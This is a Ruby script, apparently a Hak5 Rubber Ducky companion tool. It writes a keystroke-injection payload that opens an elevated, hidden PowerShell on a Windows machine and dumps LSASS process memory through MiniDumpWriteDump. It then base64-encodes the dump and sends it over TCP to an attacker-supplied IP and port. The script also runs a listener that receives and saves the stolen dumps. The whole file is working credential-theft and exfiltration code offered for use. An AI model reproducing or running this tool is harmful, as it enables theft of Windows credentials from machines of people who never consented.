#!/usr/bin/env ruby
# Big Thanks to @gentilkiwi http://blog.gentilkiwi.com/securite/mimikatz/minidump, @mattifestation http://www.exploit-monday.com/, @mubix http://www.room362.com/ and Darren https://forums.hak5.org/
# Written by James Cook @b00stfr3ak44
require 'socket'
require 'base64'
def print_error(text)
  print "\e[31m[-]\e[0m #{text}"
end
def print_success(text)
  print "\e[32m[+]\e[0m #{text}"
end
def print_info(text)
  print "\e[34m[*]\e[0m #{text}"
end
def get_input(text)
  print "\e[33m[!]\e[0m #{text}"
end
def get_host()
  host_name = [(get_input("Enter the host ip to listen on: ") ), $stdin.gets.rstrip][1]
  ip = host_name.split('.')
  if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil
    print_error("Not a valid IP\n") 
    get_host()
  end
    print_success("Using #{host_name} as server\n")
    return host_name
end
def get_port()
  port = [(get_input("Enter the port you would like to use or leave blank for [443]: ") ), $stdin.gets.rstrip][1]
  if port == ''
    port = '443'
    print_success("Using #{port}\n")
    return port
  elsif not (1..65535).cover?(port.to_i)
    print_error("Not a valid port\n")
    sleep(1)
    port()
  else 
    print_success("Using #{port}\n")
    return port
  end
end
def ducky_setup(host,port)
  lsass_file = 'c:\windows\temp\lsass.dmp'
  powershell_command1 = %($proc = ps lsass;$proc_handle = $proc.Handle;$proc_id = $proc.Id; $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$MiniDumpWithFullMemory = [UInt32] 2; $FileStream = New-Object IO.FileStream("#{lsass_file}", [IO.FileMode]::Create);$Result = $MiniDumpWriteDump.Invoke($null,@($proc_handle,$proc_id,$FileStream.SafeFileHandle,$MiniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero));exit)
	powershell_command2 = %($lsass_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{lsass_file}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("lsass");$writer.flush();$writer.WriteLine($lsass_file);$writer.flush();$socket.close())
  encoded_command1 = Base64.encode64(powershell_command1.encode("utf-16le")).delete("\r\n")
  encoded_command2 = Base64.encode64(powershell_command2.encode("utf-16le")).delete("\r\n")
  File.open("lsassdump_tcp.txt","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command1}\nENTER\nDELAY 500\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 1000\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command2}\nENTER")}
end
def server(port)
  print_info("Starting Server!\n")
  server = TCPServer.open(port.to_i)
  x = 0
  loop{  
    Thread.start(server.accept) do |client|  
      file_name = client.recv(1024)
      print_success("Got #{file_name.strip} file!\n")
			print_info("Getting Data\n")
      out_put = client.gets()
			print_info("Writing to File\n")
      File.open("#{file_name.strip}#{x}.dmp","w") {|f| f.write(Base64.decode64(out_put))}
			print_success("File Done!\n")
      x += 1
    end
  }
  rescue => error
    print_error(error)
end
begin
  host = get_host()
  port = get_port()
  ducky_setup(host,port)
  start_listener = [(get_input("Would you like to set up the server now?[yes/no] ") ), $stdin.gets.rstrip][1]
  if start_listener == 'yes'
    server(port)
  end
end
